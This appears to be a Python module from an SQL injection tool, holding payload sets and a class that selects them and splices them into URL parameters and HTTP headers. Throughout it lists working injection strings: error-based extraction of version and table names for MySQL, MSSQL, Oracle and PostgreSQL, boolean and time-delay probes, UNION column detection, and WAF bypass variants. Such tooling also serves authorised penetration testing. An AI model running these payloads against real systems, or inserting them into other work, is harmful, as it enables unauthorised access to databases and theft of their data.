"""
m7sql.brain.payload_brain — Smart Payload Decision Engine
Decision tree: Quote → Error → Boolean → Time (5x verify)
Not random — methodical, fast, minimal requests.
"""

import os
import random

_HERE = os.path.dirname(__file__)


# ── Payload sets per technique ────────────────────────────────

QUOTE_PROBES = ["'", '"', '`', "')"]

ERROR_PAYLOADS = {
    "generic": [
        "' AND 1=1--+",
        "' AND 1=2--+",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "1 AND 1=1",
        "1 AND 1=2",
    ],
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--+",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)--+",
        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--+",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM "
        "information_schema.tables LIMIT 1)))--+",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name "
        "FROM information_schema.tables))--",
        "'; SELECT @@version--",
    ],
    "oracle": [
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')--",
        "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||version())) FROM dual)--",
    ],
    "postgresql": [
        "' AND 1=CAST(version() AS int)--",
        "'; SELECT pg_sleep(0)--",
    ],
}

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--+", "' AND 1=2--+"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 1=1--+", "' OR 1=2--+"),
    ("' AND (SELECT 1)='1", "' AND (SELECT 2)='1"),
]

TIME_PAYLOADS = {
    "mysql":      ["' AND SLEEP({n})--+", "1' AND SLEEP({n})--+",
                   "' OR SLEEP({n})--+", "1) AND SLEEP({n})--+"],
    "mssql":      ["'; WAITFOR DELAY '0:0:{n}'--",
                   "1; WAITFOR DELAY '0:0:{n}'--"],
    "postgresql": ["'; SELECT pg_sleep({n})--",
                   "1; SELECT pg_sleep({n})--"],
    "oracle":     ["' AND 1=(SELECT 1 FROM (SELECT SLEEP({n}) FROM dual))--"],
    "generic":    ["' AND SLEEP({n})--+", "1 AND SLEEP({n})--+"],
}

UNION_DETECT = [
    "' ORDER BY 1--+",
    "' ORDER BY 5--+",
    "' ORDER BY 10--+",
    "' UNION SELECT NULL--+",
    "' UNION SELECT NULL,NULL--+",
    "' UNION SELECT NULL,NULL,NULL--+",
    "' UNION SELECT NULL,NULL,NULL,NULL--+",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--+",
]

WAF_BYPASS = {
    "comment":   ["'/**/OR/**/1=1--+", "UN/**/ION SE/**/LECT NULL",
                  "' /*!OR*/ '1'='1"],
    "case":      ["' Or '1'='1", "UnIoN SeLeCt NULL",
                  "' AnD '1'='1"],
    "encoding":  ["' OR 0x313d31--+", "%27 OR %271%27=%271",
                  "' OR CHAR(49)=CHAR(49)--"],
    "whitespace":["'\tOR\t1=1--+", "' OR%0A1=1--+",
                  "' OR%091=1--+"],
}


class PayloadBrain:
    """
    Smart payload selector using decision tree.
    Minimal requests, maximum signal.
    """

    def get_quote_probes(self) -> list:
        return QUOTE_PROBES

    def get_error_payloads(self, dbms: str = "generic", count: int = 5) -> list:
        pool = ERROR_PAYLOADS.get(dbms.lower(), ERROR_PAYLOADS["generic"])
        generic = ERROR_PAYLOADS["generic"]
        combined = list(dict.fromkeys(pool + generic))  # deduplicate, preserve order
        return combined[:count]

    def get_boolean_pairs(self, count: int = 3) -> list:
        return BOOLEAN_PAIRS[:count]

    def get_time_payloads(self, dbms: str = "generic",
                          sleep_secs: int = 5, count: int = 3) -> list:
        pool = TIME_PAYLOADS.get(dbms.lower(), TIME_PAYLOADS["generic"])
        result = [p.replace("{n}", str(sleep_secs)) for p in pool]
        return result[:count]

    def get_union_detect(self) -> list:
        return UNION_DETECT

    def get_bypass_payloads(self, strategy: str = "comment") -> list:
        return WAF_BYPASS.get(strategy, WAF_BYPASS["comment"])

    def inject_param(self, url: str, param: str, payload: str) -> str:
        """
        Inject payload into URL param.
        Uses string replacement (not urlencode) to preserve payload chars.
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        qs     = parse_qs(parsed.query, keep_blank_values=True)

        if param in qs:
            original = qs[param][0]
            # Build new query string manually to avoid encoding payload
            new_parts = []
            for k, vals in qs.items():
                if k == param:
                    new_parts.append(f"{k}={original}{payload}")
                else:
                    for v in vals:
                        new_parts.append(f"{k}={v}")
            new_query = "&".join(new_parts)
        else:
            existing = parsed.query
            sep = "&" if existing else ""
            new_query = f"{existing}{sep}{param}={payload}"

        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, new_query, ""))

    def inject_header(self, headers: dict, header_name: str,
                      payload: str) -> dict:
        """Inject payload into a header value."""
        new_headers = dict(headers)
        new_headers[header_name] = payload
        return new_headers
